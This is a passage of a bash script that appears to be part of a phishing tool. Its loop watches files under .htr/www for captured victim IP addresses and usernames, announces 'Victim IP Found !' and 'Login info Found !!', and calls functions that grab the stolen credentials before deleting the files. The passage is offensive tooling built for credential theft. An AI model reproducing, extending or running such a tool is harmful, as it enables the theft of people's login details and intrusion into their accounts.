printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do


if [[ -e ".htr/www/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grab_creds
rm -rf .htr/www/usernames.txt
fi
sleep 0.75


done 

}

banner
reqs
menu
